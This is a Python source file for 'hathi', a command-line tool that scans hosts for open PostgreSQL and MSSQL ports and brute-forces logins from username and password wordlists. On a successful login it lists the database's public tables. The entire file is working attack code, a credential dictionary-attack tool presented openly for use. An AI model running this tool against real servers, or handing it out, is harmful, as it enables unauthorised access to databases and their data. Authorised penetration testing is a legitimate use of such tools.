"""
Requirements:
 > pip install -r requirements.txt


Usage: hathi [-h] [--usernames USERNAMES] [--passwords PASSWORDS] [--results RESULTS] [--hostname HOSTNAME] [--verbose] host [host ...]

Port scan and dictionary attack postgresql servers.

positional arguments:
  host                  host to connect to

optional arguments:
  -h, --help            show this help message and exit
  --usernames USERNAMES
                        password list
  --passwords PASSWORDS
                        password list
  --results RESULTS     path to a results file
  --hostname HOSTNAME   an @hostname to append to the usernames
  --verbose
"""

import argparse
import time
import asyncio
import asyncpg
import pymssql
from typing import List, Optional
from collections import namedtuple
from enum import Enum

timeout = 1.0
SSL_MODE = (
    "require"  # require = required, Try SSL first and fallback to non-SSL if failed
)


class HostType(Enum):
    Postgres = "postgres"
    Mssql = "mssql"


DEFAULT_PORTS = {HostType.Postgres: 5432, HostType.Mssql: 1433}
DEFAULT_DATABASE_NAME = {HostType.Postgres: "postgres", HostType.Mssql: "master"}

Match = namedtuple("Match", "username password host database data")


async def try_hosts(hosts: List[str], port: int):
    found = 0
    for host in hosts:
        try:
            future = asyncio.open_connection(host=host, port=port)
            _, w = await asyncio.wait_for(future, timeout=timeout)
            yield host
            found += 1
            w.close()
        except (asyncio.TimeoutError, OSError):
            print(f"Could not connect to {host}")


async def pg_try_connection(
    host: str,
    database: str,
    usernames: str,
    passwords: str,
    hostname: Optional[str] = None,
    verbose=False,
    multiple=False,
):
    with open(usernames, "r") as username_list:
        for username in username_list:
            username = username.strip()
            if hostname:
                username = f"{username}@{hostname}"
            with open(passwords, "r") as password_list:
                for password in password_list:
                    password = password.strip()
                    try:
                        conn = await asyncpg.connect(
                            user=username,
                            password=password,
                            database=database,
                            host=host,
                            ssl=SSL_MODE,
                            timeout=timeout,
                        )
                        data = await conn.fetch(
                            "select table_name from information_schema.tables where table_schema='public';"
                        )
                        if verbose:
                            print(f"Matched {username}:{password} on {host}")
                        yield Match(username, password, host, database, data)
                        await conn.close()
                        if multiple:
                            break
                        else:
                            return
                    except asyncpg.exceptions.InvalidPasswordError as pe:
                        if verbose:
                            print(f"Invalid password {password} : ({pe})")
                    except asyncpg.exceptions.InvalidAuthorizationSpecificationError as pe:
                        if verbose:
                            print(f"Invalid username {username} : ({pe})")
                        break
                    except asyncpg.exceptions._base.PostgresError as pe:
                        if verbose:
                            print(
                                f"Failed {username}:{password} on {host} {pe} {type(pe)}"
                            )
                        pass
                    except asyncio.TimeoutError:
                        if verbose:
                            print(f"Timeout {username}:{password} on {host}")
                        pass  # closed


def mssql_try_connection(
    host: str,
    database: str,
    usernames: str,
    passwords: str,
    hostname: Optional[str] = None,
    verbose=False,
    multiple=False,
):
    with open(usernames, "r") as username_list:
        for username in username_list:
            username = username.strip()
            if hostname:
                username = f"{username}@{hostname}"
            with open(passwords, "r") as password_list:
                for password in password_list:
                    password = password.strip()
                    try:
                        conn = pymssql.connect(
                            host,
                            username,
                            password,
                            database,
                        )

                        if verbose:
                            print(f"Matched {username}:{password} on {host}")
                        yield Match(username, password, host, database, {})
                        conn.close()
                        if multiple:
                            break
                        else:
                            return
                    except pymssql.OperationalError:
                        if verbose:
                            print(f"Invalid username/password {username} : {password}")


async def scan(
    hosts: List[str],
    usernames: str,
    passwords: str,
    hostname: Optional[str] = None,
    verbose=False,
    host_type: HostType = HostType.Postgres,
    multiple: bool = False,
):
    open_hosts = []
    async for open_host in try_hosts(hosts, DEFAULT_PORTS[host_type]):
        open_hosts.append(open_host)

    database = DEFAULT_DATABASE_NAME[host_type]

    print(f"Found open hosts {open_hosts}, trying to connect")
    matched_connections = []

    if host_type == HostType.Postgres:
        for host in open_hosts:
            async for match in pg_try_connection(
                host, database, usernames, passwords, hostname, verbose, multiple
            ):
                matched_connections.append(match)
    elif host_type == HostType.Mssql:
        for host in open_hosts:
            for match in mssql_try_connection(
                host, database, usernames, passwords, hostname, verbose, multiple
            ):
                matched_connections.append(match)
    return matched_connections


def main():
    parser = argparse.ArgumentParser(
        description="Port scan and dictionary attack PostgreSQL and MSSQL servers."
    )
    parser.add_argument(
        "hosts", metavar="host", type=str, nargs="+", help="host to scan"
    )
    parser.add_argument(
        "--usernames", type=str, default="usernames.txt", help="password list"
    )
    parser.add_argument(
        "--passwords", type=str, default="passwords.txt", help="password list"
    )
    parser.add_argument("--results", type=str, help="path to a results file")
    parser.add_argument(
        "--hostname", type=str, help="an @hostname to append to the usernames"
    )
    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
    parser.add_argument("--mssql", action="store_true", help="Host is MSSQL")
    parser.add_argument("--postgres", action="store_true", help="Host is Postgres")
    parser.add_argument(
        "--multiple",
        action="store_true",
        help="Seek multiple username/password pairs on a single host",
    )

    args = parser.parse_args()
    start = time.time()

    host_type = HostType.Mssql if args.mssql else HostType.Postgres

    results = asyncio.run(
        scan(
            args.hosts,
            args.usernames,
            args.passwords,
            args.hostname,
            verbose=args.verbose,
            host_type=host_type,
            multiple=args.multiple,
        )
    )

    if args.results:
        with open(args.results) as results_f:
            results_f.writelines(results)

    for result in results:
        print(f"{result}")

    print("Completed scan in {0} seconds".format(time.time() - start))


if __name__ == "__main__":
    main()
